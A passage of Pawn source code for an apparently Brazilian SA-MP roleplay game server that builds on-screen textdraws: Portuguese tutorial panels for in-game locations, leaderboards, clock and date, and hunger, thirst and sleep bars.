	TextDrawSetShadow(DelegaciaTuto[2], 1);
	TextDrawSetSelectable(DelegaciaTuto[2], 0);

	DelegaciaTuto[3] = TextDrawCreate(165.000000, 240.000000, "Caso voce for um infrator da lei, ao ser preso, voce sera~n~levado de imediato a delegacia.");
	TextDrawBackgroundColor(DelegaciaTuto[3], 255);
	TextDrawFont(DelegaciaTuto[3], 1);
	TextDrawLetterSize(DelegaciaTuto[3], 0.300000, 1.600000);
	TextDrawColor(DelegaciaTuto[3], -1);
	TextDrawSetOutline(DelegaciaTuto[3], 0);
	TextDrawSetProportional(DelegaciaTuto[3], 1);
	TextDrawSetShadow(DelegaciaTuto[3], 1);
	TextDrawSetSelectable(DelegaciaTuto[3], 0);

	DelegaciaTuto[4] = TextDrawCreate(165.000000, 270.000000, "O tempo de prisao varia de acordo com seu nivel de~n~procurado, quanto maior for mais tempo voce ficara preso.");
	TextDrawBackgroundColor(DelegaciaTuto[4], 255);
	TextDrawFont(DelegaciaTuto[4], 1);
	TextDrawLetterSize(DelegaciaTuto[4], 0.300000, 1.600000);
	TextDrawColor(DelegaciaTuto[4], -1);
	TextDrawSetOutline(DelegaciaTuto[4], 0);
	TextDrawSetProportional(DelegaciaTuto[4], 1);
	TextDrawSetShadow(DelegaciaTuto[4], 1);
	TextDrawSetSelectable(DelegaciaTuto[4], 0);//
	//HospitalTuto
	HospitalTuto[0] = TextDrawCreate(165.000000, 164.000000, "Esse e um dos hospitais do servidor, localizado em Market.");
	TextDrawBackgroundColor(HospitalTuto[0], 255);
	TextDrawFont(HospitalTuto[0], 1);
	TextDrawLetterSize(HospitalTuto[0], 0.300000, 1.600000);
	TextDrawColor(HospitalTuto[0], -1);
	TextDrawSetOutline(HospitalTuto[0], 0);
	TextDrawSetProportional(HospitalTuto[0], 1);
	TextDrawSetShadow(HospitalTuto[0], 1);
	TextDrawSetSelectable(HospitalTuto[0], 0);

	HospitalTuto[1] = TextDrawCreate(165.000000, 180.000000, "Toda vez que voce morrer, voce sera automaticamente~n~levado ao hosptial, onde sera tratado.");
	TextDrawBackgroundColor(HospitalTuto[1], 255);
	TextDrawFont(HospitalTuto[1], 1);
	TextDrawLetterSize(HospitalTuto[1], 0.300000, 1.600000);
	TextDrawColor(HospitalTuto[1], -1);
	TextDrawSetOutline(HospitalTuto[1], 0);
	TextDrawSetProportional(HospitalTuto[1], 1);
	TextDrawSetShadow(HospitalTuto[1], 1);
	TextDrawSetSelectable(HospitalTuto[1], 0);

	HospitalTuto[2] = TextDrawCreate(165.000000, 210.000000, "Caso nao queira pagar taxas, basta comprar um convenio~n~medico, adquirido no hospital.");
	TextDrawBackgroundColor(HospitalTuto[2], 255);
	TextDrawFont(HospitalTuto[2], 1);
	TextDrawLetterSize(HospitalTuto[2], 0.300000, 1.600000);
	TextDrawColor(HospitalTuto[2], -1);
	TextDrawSetOutline(HospitalTuto[2], 0);
	TextDrawSetProportional(HospitalTuto[2], 1);
	TextDrawSetShadow(HospitalTuto[2], 1);
	TextDrawSetSelectable(HospitalTuto[2], 0);

	HospitalTuto[3] = TextDrawCreate(165.000000, 240.000000, "A cada morte voce perde o dinheiro em maos, para evitar~n~isso, contrate o seguro de acidentes.");
	TextDrawBackgroundColor(HospitalTuto[3], 255);
	TextDrawFont(HospitalTuto[3], 1);
	TextDrawLetterSize(HospitalTuto[3], 0.300000, 1.600000);
	TextDrawColor(HospitalTuto[3], -1);
	TextDrawSetOutline(HospitalTuto[3], 0);
	TextDrawSetProportional(HospitalTuto[3], 1);
	TextDrawSetShadow(HospitalTuto[3], 1);
	TextDrawSetSelectable(HospitalTuto[3], 0);

	HospitalTuto[4] = TextDrawCreate(165.000000, 270.000000, "Aqui voce tambem pode tratar casos de drogas adquirindo~n~cura.");
	TextDrawBackgroundColor(HospitalTuto[4], 255);
	TextDrawFont(HospitalTuto[4], 1);
	TextDrawLetterSize(HospitalTuto[4], 0.300000, 1.600000);
	TextDrawColor(HospitalTuto[4], -1);
	TextDrawSetOutline(HospitalTuto[4], 0);
	TextDrawSetProportional(HospitalTuto[4], 1);
	TextDrawSetShadow(HospitalTuto[4], 1);
	TextDrawSetSelectable(HospitalTuto[4], 0);//
	//PostoTuto
	PostoTuto[0] = TextDrawCreate(165.000000, 190.000000, "Esse e um dos postos de combustivel, localizado em Idlewood.");
	TextDrawBackgroundColor(PostoTuto[0], 255);
	TextDrawFont(PostoTuto[0], 1);
	TextDrawLetterSize(PostoTuto[0], 0.300000, 1.600000);
	TextDrawColor(PostoTuto[0], -1);
	TextDrawSetOutline(PostoTuto[0], 0);
	TextDrawSetProportional(PostoTuto[0], 1);
	TextDrawSetShadow(PostoTuto[0], 1);
	TextDrawSetSelectable(PostoTuto[0], 0);

	PostoTuto[1] = TextDrawCreate(165.000000, 208.000000, "Aqui voce podera abastecer seu tanque de combustivel, por~n~~g~R$2,00 ~w~reais o litro.");
	TextDrawBackgroundColor(PostoTuto[1], 255);
	TextDrawFont(PostoTuto[1], 1);
	TextDrawLetterSize(PostoTuto[1], 0.300000, 1.600000);
	TextDrawColor(PostoTuto[1], -1);
	TextDrawSetOutline(PostoTuto[1], 0);
	TextDrawSetProportional(PostoTuto[1], 1);
	TextDrawSetShadow(PostoTuto[1], 1);
	TextDrawSetSelectable(PostoTuto[1], 0);

	PostoTuto[2] = TextDrawCreate(165.000000, 240.000000, "Caso fique sem combustivel, basta procurar um dos varios~n~postos que estao espalhados por San Andreas.");
	TextDrawBackgroundColor(PostoTuto[2], 255);
	TextDrawFont(PostoTuto[2], 1);
	TextDrawLetterSize(PostoTuto[2], 0.300000, 1.600000);
	TextDrawColor(PostoTuto[2], -1);
	TextDrawSetOutline(PostoTuto[2], 0);
	TextDrawSetProportional(PostoTuto[2], 1);
	TextDrawSetShadow(PostoTuto[2], 1);
	TextDrawSetSelectable(PostoTuto[2], 0);//
	//UtilTuto
	UtilTuto[0] = TextDrawCreate(165.000000, 192.000000, "Essa e a loja de utilitarios do servidor.");
	TextDrawBackgroundColor(UtilTuto[0], 255);
	TextDrawFont(UtilTuto[0], 1);
	TextDrawLetterSize(UtilTuto[0], 0.300000, 1.600000);
	TextDrawColor(UtilTuto[0], -1);
	TextDrawSetOutline(UtilTuto[0], 0);
	TextDrawSetProportional(UtilTuto[0], 1);
	TextDrawSetShadow(UtilTuto[0], 1);
	TextDrawSetSelectable(UtilTuto[0], 0);

	UtilTuto[1] = TextDrawCreate(165.000000, 208.000000, "Aqui na loja de utilitarios voce encontra diversos itens, como~n~celular, GPS, e outros.");
	TextDrawBackgroundColor(UtilTuto[1], 255);
	TextDrawFont(UtilTuto[1], 1);
	TextDrawLetterSize(UtilTuto[1], 0.300000, 1.600000);
	TextDrawColor(UtilTuto[1], -1);
	TextDrawSetOutline(UtilTuto[1], 0);
	TextDrawSetProportional(UtilTuto[1], 1);
	TextDrawSetShadow(UtilTuto[1], 1);
	TextDrawSetSelectable(UtilTuto[1], 0);

	UtilTuto[2] = TextDrawCreate(165.000000, 240.000000, "A loja de utilitarios e atualizada com frequencia para adicao~n~ou atualizacao de itens.");
	TextDrawBackgroundColor(UtilTuto[2], 255);
	TextDrawFont(UtilTuto[2], 1);
	TextDrawLetterSize(UtilTuto[2], 0.300000, 1.600000);
	TextDrawColor(UtilTuto[2], -1);
	TextDrawSetOutline(UtilTuto[2], 0);
	TextDrawSetProportional(UtilTuto[2], 1);
	TextDrawSetShadow(UtilTuto[2], 1);
	TextDrawSetSelectable(UtilTuto[2], 0);//
	//SkinTuto
	SkinTuto[0] = TextDrawCreate(165.000000, 191.000000, "Essa e uma das lojas de roupas do servidor, localizada~n~em Ganton.");
	TextDrawBackgroundColor(SkinTuto[0], 255);
	TextDrawFont(SkinTuto[0], 1);
	TextDrawLetterSize(SkinTuto[0], 0.300000, 1.600000);
	TextDrawColor(SkinTuto[0], -1);
	TextDrawSetOutline(SkinTuto[0], 0);
	TextDrawSetProportional(SkinTuto[0], 1);
	TextDrawSetShadow(SkinTuto[0], 1);
	TextDrawSetSelectable(SkinTuto[0], 0);

	SkinTuto[1] = TextDrawCreate(165.000000, 222.000000, "Alem de skins, voce podera tambem comprar itens, como~n~oculos, chapeus e outros.");
	TextDrawBackgroundColor(SkinTuto[1], 255);
	TextDrawFont(SkinTuto[1], 1);
	TextDrawLetterSize(SkinTuto[1], 0.300000, 1.600000);
	TextDrawColor(SkinTuto[1], -1);
	TextDrawSetOutline(SkinTuto[1], 0);
	TextDrawSetProportional(SkinTuto[1], 1);
	TextDrawSetShadow(SkinTuto[1], 1);
	TextDrawSetSelectable(SkinTuto[1], 0);

	SkinTuto[2] = TextDrawCreate(165.000000, 252.000000, "E importante lembrar que cada loja possui skins diferentes.");
	TextDrawBackgroundColor(SkinTuto[2], 255);
	TextDrawFont(SkinTuto[2], 1);
	TextDrawLetterSize(SkinTuto[2], 0.300000, 1.600000);
	TextDrawColor(SkinTuto[2], -1);
	TextDrawSetOutline(SkinTuto[2], 0);
	TextDrawSetProportional(SkinTuto[2], 1);
	TextDrawSetShadow(SkinTuto[2], 1);
	TextDrawSetSelectable(SkinTuto[2], 0);//
	//NeedsTuto
	NeedsTuto[0] = TextDrawCreate(165.000000, 164.000000, "Essa e uma das lanchonetes do servidor, localizada em~n~Vinewood.");
	TextDrawBackgroundColor(NeedsTuto[0], 255);
	TextDrawFont(NeedsTuto[0], 1);
	TextDrawLetterSize(NeedsTuto[0], 0.300000, 1.600000);
	TextDrawColor(NeedsTuto[0], -1);
	TextDrawSetOutline(NeedsTuto[0], 0);
	TextDrawSetProportional(NeedsTuto[0], 1);
	TextDrawSetShadow(NeedsTuto[0], 1);
	TextDrawSetSelectable(NeedsTuto[0], 0);

	NeedsTuto[1] = TextDrawCreate(165.000000, 194.000000, "Apenas para alertas sobre o sistema de necessidades, a sua~n~fome, sede e sono vai diminuindo com o passar do tempo.");
	TextDrawBackgroundColor(NeedsTuto[1], 255);
	TextDrawFont(NeedsTuto[1], 1);
	TextDrawLetterSize(NeedsTuto[1], 0.300000, 1.600000);
	TextDrawColor(NeedsTuto[1], -1);
	TextDrawSetOutline(NeedsTuto[1], 0);
	TextDrawSetProportional(NeedsTuto[1], 1);
	TextDrawSetShadow(NeedsTuto[1], 1);
	TextDrawSetSelectable(NeedsTuto[1], 0);

	NeedsTuto[2] = TextDrawCreate(165.000000, 224.000000, "Quando a barra de fome encontrar-se zerada, voce~n~desmaiara de fome, o mesmo para sede e sono.");
	TextDrawBackgroundColor(NeedsTuto[2], 255);
	TextDrawFont(NeedsTuto[2], 1);
	TextDrawLetterSize(NeedsTuto[2], 0.300000, 1.600000);
	TextDrawColor(NeedsTuto[2], -1);
	TextDrawSetOutline(NeedsTuto[2], 0);
	TextDrawSetProportional(NeedsTuto[2], 1);
	TextDrawSetShadow(NeedsTuto[2], 1);
	TextDrawSetSelectable(NeedsTuto[2], 0);

	NeedsTuto[3] = TextDrawCreate(165.000000, 254.000000, "Voce podera recuperar sua fome com lanches, sede com~n~bebidas, e sono dormindo (caminhoneiros podem dormir no~n~caminhao).");
	TextDrawBackgroundColor(NeedsTuto[3], 255);
	TextDrawFont(NeedsTuto[3], 1);
	TextDrawLetterSize(NeedsTuto[3], 0.300000, 1.600000);
	TextDrawColor(NeedsTuto[3], -1);
	TextDrawSetOutline(NeedsTuto[3], 0);
	TextDrawSetProportional(NeedsTuto[3], 1);
	TextDrawSetShadow(NeedsTuto[3], 1);
	TextDrawSetSelectable(NeedsTuto[3], 0);//
//-------------------------------- Tutorial ------------------------------------
	// Box Velocímetro
	/*BoxVeloc = TextDrawCreate(141.000000, 379.000000, "_");
	TextDrawBackgroundColor(BoxVeloc, 255);
	TextDrawFont(BoxVeloc, 1);
	TextDrawLetterSize(BoxVeloc, 1.399999, 4.299999);
	TextDrawColor(BoxVeloc, -1);
	TextDrawSetOutline(BoxVeloc, 0);
	TextDrawSetProportional(BoxVeloc, 1);
	TextDrawSetShadow(BoxVeloc, 1);
	TextDrawUseBox(BoxVeloc, 1);
	TextDrawBoxColor(BoxVeloc, 80);
	TextDrawTextSize(BoxVeloc, 267.000000, 0.000000);
	TextDrawSetSelectable(BoxVeloc, 0);*/
	//--
	text_Top5[0] = TextDrawCreate(79.000000, 135.000000, "~g~~h~Lideranca");
	TextDrawAlignment(text_Top5[0], 2);
	TextDrawBackgroundColor(text_Top5[0], 255);
	TextDrawFont(text_Top5[0], 1);
	TextDrawLetterSize(text_Top5[0], 0.280000, 1.499999);
	TextDrawColor(text_Top5[0], -1);
	TextDrawSetOutline(text_Top5[0], 0);
	TextDrawSetProportional(text_Top5[0], 1);
	TextDrawSetShadow(text_Top5[0], 0);
    //--
	text_Top5[1] = TextDrawCreate(16.000000, 135.000000, "			");
	TextDrawBackgroundColor(text_Top5[1], 255);
	TextDrawFont(text_Top5[1], 1);
	TextDrawLetterSize(text_Top5[1], 0.200000, 0.999999);
	TextDrawColor(text_Top5[1], -1);
	TextDrawSetOutline(text_Top5[1], 0);
	TextDrawSetProportional(text_Top5[1], 1);
	TextDrawSetShadow(text_Top5[1], 0);
	TextDrawUseBox(text_Top5[1], 1);
	TextDrawBoxColor(text_Top5[1], 150);
	TextDrawTextSize(text_Top5[1], 143.000000, 20.000000);
	//--
	TextLoteria = TextDrawCreate(313.000000, 122.000000, "			");
	TextDrawAlignment(TextLoteria, 2);
	TextDrawBackgroundColor(TextLoteria, 255);
	TextDrawFont(TextLoteria, 1);
	TextDrawLetterSize(TextLoteria, 0.620000, 1.800001);
	TextDrawColor(TextLoteria, -1);
	TextDrawSetOutline(TextLoteria, 1);
	TextDrawSetProportional(TextLoteria, 1);
	//--
	TextNumero = TextDrawCreate(317.000000, 377.000000, "			");
	TextDrawAlignment(TextNumero, 2);
	TextDrawBackgroundColor(TextNumero, 255);
	TextDrawFont(TextNumero, 1);
	TextDrawLetterSize(TextNumero, 0.899999, 2.799999);
	TextDrawColor(TextNumero, -1);
	TextDrawSetOutline(TextNumero, 1);
	TextDrawSetProportional(TextNumero, 1);
	//--
	Flash = TextDrawCreate(-20.000000, 2.000000, "|");
	TextDrawUseBox(Flash, 1);
	TextDrawBoxColor(Flash, 0xffffff66);
	TextDrawTextSize(Flash, 660.000000,22.000000);
	TextDrawAlignment(Flash, 0);
	TextDrawBackgroundColor(Flash, 0x000000ff);
	TextDrawFont(Flash, 3);
	TextDrawLetterSize(Flash, 1.000000, 52.200000);
	TextDrawColor(Flash, 0xffffffff);
	TextDrawSetOutline(Flash, 1);
	TextDrawSetProportional(Flash, 1);
	TextDrawSetShadow(Flash, 1);
	//--
	Enquete = TextDrawCreate(318.000000, 238.000000, "			");
	TextDrawAlignment(Enquete, 2);
	TextDrawBackgroundColor(Enquete, 255);
	TextDrawFont(Enquete, 1);
	TextDrawLetterSize(Enquete, 0.330000, 1.200000);
	TextDrawColor(Enquete, -1);
	TextDrawSetOutline(Enquete, 1);
	TextDrawSetProportional(Enquete, 1);
	//--
	ContagemEnquete = TextDrawCreate(320.000000, 303.000000, "			");
	TextDrawAlignment(ContagemEnquete, 2);
	TextDrawBackgroundColor(ContagemEnquete, 255);
	TextDrawFont(ContagemEnquete, 1);
	TextDrawLetterSize(ContagemEnquete, 0.450000, 1.300000);
	TextDrawColor(ContagemEnquete, -1);
	TextDrawSetOutline(ContagemEnquete, 1);
	TextDrawSetProportional(ContagemEnquete, 1);
	//-- Data
	Data = TextDrawCreate(563.000000, 395.000000, "			");
	TextDrawBackgroundColor(Data, 255);
	TextDrawFont(Data, 2);
	TextDrawLetterSize(Data, 0.260000, 1.000000);
	TextDrawColor(Data, -1);
	TextDrawSetOutline(Data, 1);
	TextDrawSetProportional(Data, 1);
	TextDrawSetSelectable(Data, 0);
	//--
	RDinheiro = TextDrawCreate(488.000000, 78.000000, "R");
	TextDrawBackgroundColor(RDinheiro, 255);
	TextDrawFont(RDinheiro, 3);
	TextDrawLetterSize(RDinheiro, 0.470000, 2.000000);
	TextDrawColor(RDinheiro, 744893695);
	TextDrawSetOutline(RDinheiro, 2);
	TextDrawSetProportional(RDinheiro, 1);
	//-- Relógio
	Relogio = TextDrawCreate(579.000000, 380.000000, "			");
	TextDrawBackgroundColor(Relogio, 255);
	TextDrawFont(Relogio, 2);
	TextDrawLetterSize(Relogio, 0.260000, 1.000000);
	TextDrawColor(Relogio, -1);
	TextDrawSetOutline(Relogio, 1);
	TextDrawSetProportional(Relogio, 1);
	TextDrawSetSelectable(Relogio, 0);
	//-- Barra1
	Barra1 = TextDrawCreate(545.000000, 406.000000, "-");
	TextDrawBackgroundColor(Barra1, 255);
	TextDrawFont(Barra1, 1);
	TextDrawLetterSize(Barra1, 6.689998, 0.300000);
	TextDrawColor(Barra1, -1);
	TextDrawSetOutline(Barra1, 1);
	TextDrawSetProportional(Barra1, 1);
	TextDrawSetSelectable(Barra1, 0);
	//-- Barra2
	Barra2 = TextDrawCreate(545.000000, 391.000000, "-");
	TextDrawBackgroundColor(Barra2, 255);
	TextDrawFont(Barra2, 1);
	TextDrawLetterSize(Barra2, 6.689998, 0.300000);
	TextDrawColor(Barra2, -1);
	TextDrawSetOutline(Barra2, 1);
	TextDrawSetProportional(Barra2, 1);
	TextDrawSetSelectable(Barra2, 0);
	//-- Barra3
	Barra3 = TextDrawCreate(545.000000, 377.000000, "-");
	TextDrawBackgroundColor(Barra3, 255);
	TextDrawFont(Barra3, 1);
	TextDrawLetterSize(Barra3, 6.689998, 0.300000);
	TextDrawColor(Barra3, -1);
	TextDrawSetOutline(Barra3, 1);
	TextDrawSetProportional(Barra3, 1);
	TextDrawSetSelectable(Barra3, 0);
	//--
	GPSLocal = TextDrawCreate(270.000000, 390.000000, "			");
	TextDrawBackgroundColor(GPSLocal, 255);
	TextDrawFont(GPSLocal, 1);
	TextDrawLetterSize(GPSLocal, 0.450000, 1.400000);
	TextDrawColor(GPSLocal, -1);
	TextDrawSetOutline(GPSLocal, 0);
	TextDrawSetProportional(GPSLocal, 1);
	TextDrawSetShadow(GPSLocal, 1);
	TextDrawSetSelectable(GPSLocal, 0);
	//--
	InfoSite = TextDrawCreate(316.000000, 425.000000, "_");
	TextDrawAlignment(InfoSite, 2);
	TextDrawBackgroundColor(InfoSite, 255);
	TextDrawFont(InfoSite, 2);
	TextDrawLetterSize(InfoSite, 0.320000, 0.899999);
	TextDrawColor(InfoSite, -1);
	TextDrawSetOutline(InfoSite, 1);
	TextDrawSetProportional(InfoSite, 1);
	//--
	dm_text_Top5[0] = TextDrawCreate(18.000000, 186.000000, "~r~~h~5 ~y~~h~Melhores");
	TextDrawBackgroundColor(dm_text_Top5[0], 255);
	TextDrawFont(dm_text_Top5[0], 2);
	TextDrawLetterSize(dm_text_Top5[0], 0.449999, 1.399999);
	TextDrawColor(dm_text_Top5[0], -1);
	TextDrawSetOutline(dm_text_Top5[0], 1);
	TextDrawSetProportional(dm_text_Top5[0], 1);
	TextDrawSetSelectable(dm_text_Top5[0], 0);

	dm_text_Top5[1] = TextDrawCreate(37.000000, 206.000000, "		");
	TextDrawBackgroundColor(dm_text_Top5[1], 255);
	TextDrawFont(dm_text_Top5[1], 2);
	TextDrawLetterSize(dm_text_Top5[1], 0.229999, 1.100000);
	TextDrawColor(dm_text_Top5[1], -1);
	TextDrawSetOutline(dm_text_Top5[1], 1);
	TextDrawSetProportional(dm_text_Top5[1], 1);
	TextDrawSetSelectable(dm_text_Top5[1], 0);

	dmColoText[2] = TextDrawCreate(12.000000, 220.000000, "ld_otb2:ric1");
	TextDrawBackgroundColor(dmColoText[2], 255);
	TextDrawFont(dmColoText[2], 4);
	TextDrawLetterSize(dmColoText[2], 0.500000, 1.000000);
	TextDrawColor(dmColoText[2], -1);
	TextDrawSetOutline(dmColoText[2], 0);
	TextDrawSetProportional(dmColoText[2], 1);
	TextDrawSetShadow(dmColoText[2], 1);
	TextDrawUseBox(dmColoText[2], 1);
	TextDrawBoxColor(dmColoText[2], 255);
	TextDrawTextSize(dmColoText[2], 24.000000, 21.000000);
	TextDrawSetSelectable(dmColoText[2], 0);

	dmColoText[3] = TextDrawCreate(12.000000, 230.000000, "ld_otb2:ric2");
	TextDrawBackgroundColor(dmColoText[3], 255);
	TextDrawFont(dmColoText[3], 4);
	TextDrawLetterSize(dmColoText[3], 0.500000, 1.000000);
	TextDrawColor(dmColoText[3], -1);
	TextDrawSetOutline(dmColoText[3], 0);
	TextDrawSetProportional(dmColoText[3], 1);
	TextDrawSetShadow(dmColoText[3], 1);
	TextDrawUseBox(dmColoText[3], 1);
	TextDrawBoxColor(dmColoText[3], 255);
	TextDrawTextSize(dmColoText[3], 24.000000, 21.000000);
	TextDrawSetSelectable(dmColoText[3], 0);

	dmColoText[4] = TextDrawCreate(12.000000, 240.000000, "ld_otb2:ric3");
	TextDrawBackgroundColor(dmColoText[4], 255);
	TextDrawFont(dmColoText[4], 4);
	TextDrawLetterSize(dmColoText[4], 0.500000, 1.000000);
	TextDrawColor(dmColoText[4], -1);
	TextDrawSetOutline(dmColoText[4], 0);
	TextDrawSetProportional(dmColoText[4], 1);
	TextDrawSetShadow(dmColoText[4], 1);
	TextDrawUseBox(dmColoText[4], 1);
	TextDrawBoxColor(dmColoText[4], 255);
	TextDrawTextSize(dmColoText[4], 24.000000, 21.000000);
	TextDrawSetSelectable(dmColoText[4], 0);

	dmColoText[0] = TextDrawCreate(12.000000, 250.000000, "ld_otb2:ric4");
	TextDrawBackgroundColor(dmColoText[0], 255);
	TextDrawFont(dmColoText[0], 4);
	TextDrawLetterSize(dmColoText[0], 0.500000, 1.000000);
	TextDrawColor(dmColoText[0], -1);
	TextDrawSetOutline(dmColoText[0], 0);
	TextDrawSetProportional(dmColoText[0], 1);
	TextDrawSetShadow(dmColoText[0], 1);
	TextDrawUseBox(dmColoText[0], 1);
	TextDrawBoxColor(dmColoText[0], 255);
	TextDrawTextSize(dmColoText[0], 24.000000, 21.000000);
	TextDrawSetSelectable(dmColoText[0], 0);

	dmColoText[1] = TextDrawCreate(12.000000, 260.000000, "ld_otb2:ric5");
	TextDrawBackgroundColor(dmColoText[1], 255);
	TextDrawFont(dmColoText[1], 4);
	TextDrawLetterSize(dmColoText[1], 0.500000, 1.000000);
	TextDrawColor(dmColoText[1], -1);
	TextDrawSetOutline(dmColoText[1], 0);
	TextDrawSetProportional(dmColoText[1], 1);
	TextDrawSetShadow(dmColoText[1], 1);
	TextDrawUseBox(dmColoText[1], 1);
	TextDrawBoxColor(dmColoText[1], 255);
	TextDrawTextSize(dmColoText[1], 24.000000, 21.000000);
	TextDrawSetSelectable(dmColoText[1], 0);

	dmiTimer[0] = TextDrawCreate(71.000000, 284.000000, "	");
	TextDrawAlignment(dmiTimer[0], 2);
	TextDrawBackgroundColor(dmiTimer[0], 255);
	TextDrawFont(dmiTimer[0], 1);
	TextDrawLetterSize(dmiTimer[0], 0.309999, 1.100000);
	TextDrawColor(dmiTimer[0], -1);
	TextDrawSetOutline(dmiTimer[0], 1);
	TextDrawSetProportional(dmiTimer[0], 1);
	TextDrawSetSelectable(dmiTimer[0], 0);

	dmiTimer[1] = TextDrawCreate(10.000000, 284.000000, "ld_grav:timer");
	TextDrawBackgroundColor(dmiTimer[1], 255);
	TextDrawFont(dmiTimer[1], 4);
	TextDrawLetterSize(dmiTimer[1], 0.500000, 1.000000);
	TextDrawColor(dmiTimer[1], -1);
	TextDrawSetOutline(dmiTimer[1], 0);
	TextDrawSetProportional(dmiTimer[1], 1);
	TextDrawSetShadow(dmiTimer[1], 1);
	TextDrawUseBox(dmiTimer[1], 1);
	TextDrawBoxColor(dmiTimer[1], 255);
	TextDrawTextSize(dmiTimer[1], 23.000000, 19.000000);
	TextDrawSetSelectable(dmiTimer[1], 0);

	//--
	for(new t = 0; t < 4; ++t)
	{
		TextAnuncio[t] = TextDrawCreate(321.000000, 180.000000, "	");
        TextDrawLetterSize(TextAnuncio[t], 0.430000, 1.600000);
        TextDrawBackgroundColor(TextAnuncio[t], 255);
        TextDrawSetProportional(TextAnuncio[t], 1);
        TextDrawSetOutline(TextAnuncio[t], 1);
		TextDrawAlignment(TextAnuncio[t], 2);
		TextDrawColor(TextAnuncio[t], -1);
	 	TextDrawFont(TextAnuncio[0], 0);
		TextDrawFont(TextAnuncio[1], 1);
		TextDrawFont(TextAnuncio[2], 2);
		TextDrawFont(TextAnuncio[3], 3);
	}

	/**
	* BAR FOME, SEDE E SONO
	*/
	Textdraw0S = TextDrawCreate(611.000000, 128.000000, "Fundo Branco");
	TextDrawBackgroundColor(Textdraw0S, 255);
	TextDrawFont(Textdraw0S, 1);
	TextDrawLetterSize(Textdraw0S, 0.500000, 0.399998);
	TextDrawColor(Textdraw0S, -256);
	TextDrawSetOutline(Textdraw0S, 0);
	TextDrawSetProportional(Textdraw0S, 1);
	TextDrawSetShadow(Textdraw0S, 0);
	TextDrawUseBox(Textdraw0S, 1);
	TextDrawBoxColor(Textdraw0S, 85);
	TextDrawTextSize(Textdraw0S, 494.000000, -2.000000);
	TextDrawSetSelectable(Textdraw0S, 0);

	/*Textdraw1S = TextDrawCreate(489.000000, 107.000000, ".");
	TextDrawBackgroundColor(Textdraw1S, 255);
	TextDrawFont(Textdraw1S, 1);
	TextDrawLetterSize(Textdraw1S, 11.500006, 0.399998);
	TextDrawColor(Textdraw1S, -106);
	TextDrawSetOutline(Textdraw1S, 0);
	TextDrawSetProportional(Textdraw1S, 1);
	TextDrawSetShadow(Textdraw1S, 1);
	TextDrawSetSelectable(Textdraw1S, 0);*/

	Textdraw2 = TextDrawCreate(608.000000, 131.000000, "Fundo Azul");
	TextDrawBackgroundColor(Textdraw2, 255);
	TextDrawFont(Textdraw2, 1);
	TextDrawLetterSize(Textdraw2, 0.500000, 0.099999);
	TextDrawColor(Textdraw2, -256);
	TextDrawSetOutline(Textdraw2, 0);
	TextDrawSetProportional(Textdraw2, 1);
	TextDrawSetShadow(Textdraw2, 0);
	TextDrawUseBox(Textdraw2, 1);
	TextDrawBoxColor(Textdraw2, -458476494);
	TextDrawTextSize(Textdraw2, 513.000000, -2.000000);
	TextDrawSetSelectable(Textdraw2, 0);

	for(new playerid = 0; playerid < MAX_PLAYERS; playerid++)
	{
		Player_barEat[playerid] = TextDrawCreate(608.000000, 131.000000, "Barra Azul");
		TextDrawBackgroundColor(Player_barEat[playerid], 255);
		TextDrawFont(Player_barEat[playerid], 1);
		TextDrawLetterSize(Player_barEat[playerid], 0.500000, 0.099999);
		TextDrawColor(Player_barEat[playerid], -256);
		TextDrawSetOutline(Player_barEat[playerid], 0);
		TextDrawSetProportional(Player_barEat[playerid], 1);
		TextDrawSetShadow(Player_barEat[playerid], 0);
		TextDrawUseBox(Player_barEat[playerid], 1);
		TextDrawBoxColor(Player_barEat[playerid], -422824705);
		TextDrawTextSize(Player_barEat[playerid], 529.000000, -2.000000);
		TextDrawSetSelectable(Player_barEat[playerid], 0);
	}

	Textdraw4 = TextDrawCreate(501.000000, 127.000000, "hud:radar_burgerShot");
	TextDrawBackgroundColor(Textdraw4, 255);
	TextDrawFont(Textdraw4, 4);
	TextDrawLetterSize(Textdraw4, 0.330000, 4.599999);
	TextDrawColor(Textdraw4, -1);
	TextDrawSetOutline(Textdraw4, 0);
	TextDrawSetProportional(Textdraw4, 1);
	TextDrawSetShadow(Textdraw4, 1);
	TextDrawUseBox(Textdraw4, 1);
	TextDrawBoxColor(Textdraw4, 865856767);
	TextDrawTextSize(Textdraw4, 10.000000, 9.000000);
	TextDrawSetSelectable(Textdraw4, 0);

	Textdraw5 = TextDrawCreate(611.000000, 144.000000, "Fundo Branco");
	TextDrawBackgroundColor(Textdraw5, 255);
	TextDrawFont(Textdraw5, 1);
	TextDrawLetterSize(Textdraw5, 0.500000, 0.399998);
	TextDrawColor(Textdraw5, -256);
	TextDrawSetOutline(Textdraw5, 0);
	TextDrawSetProportional(Textdraw5, 1);
	TextDrawSetShadow(Textdraw5, 0);
	TextDrawUseBox(Textdraw5, 1);
	TextDrawBoxColor(Textdraw5, 85);
	TextDrawTextSize(Textdraw5, 494.000000, -2.000000);
	TextDrawSetSelectable(Textdraw5, 0);

	Textdraw6 = TextDrawCreate(608.000000, 147.000000, "Fundo Amarelo");
	TextDrawBackgroundColor(Textdraw6, 255);
	TextDrawFont(Textdraw6, 1);
	TextDrawLetterSize(Textdraw6, 0.500000, 0.099999);
	TextDrawColor(Textdraw6, -256);
	TextDrawSetOutline(Textdraw6, 0);
	TextDrawSetProportional(Textdraw6, 1);
	TextDrawSetShadow(Textdraw6, 0);
	TextDrawUseBox(Textdraw6, 1);
	TextDrawBoxColor(Textdraw6, 865717298);
	TextDrawTextSize(Textdraw6, 513.000000, -2.000000);
	TextDrawSetSelectable(Textdraw6, 0);

	for(new playerid = 0; playerid < MAX_PLAYERS; playerid++)
	{
		Player_barDrink[playerid] = TextDrawCreate(608.000000, 147.000000, "Barra Amarela");
		TextDrawBackgroundColor(Player_barDrink[playerid], 255);
		TextDrawFont(Player_barDrink[playerid], 1);
		TextDrawLetterSize(Player_barDrink[playerid], 0.500000, 0.099999);
		TextDrawColor(Player_barDrink[playerid], -256);
		TextDrawSetOutline(Player_barDrink[playerid], 0);
		TextDrawSetProportional(Player_barDrink[playerid], 1);
		TextDrawSetShadow(Player_barDrink[playerid], 0);
		TextDrawUseBox(Player_barDrink[playerid], 1);
		TextDrawBoxColor(Player_barDrink[playerid], 865856767);
		TextDrawTextSize(Player_barDrink[playerid], 529.000000, -2.000000);
		TextDrawSetSelectable(Player_barDrink[playerid], 0);
	}

	Textdraw8 = TextDrawCreate(502.000000, 142.000000, "hud:radar_dateDrink");
	TextDrawBackgroundColor(Textdraw8, 255);
	TextDrawFont(Textdraw8, 4);
	TextDrawLetterSize(Textdraw8, 0.330000, 4.599998);
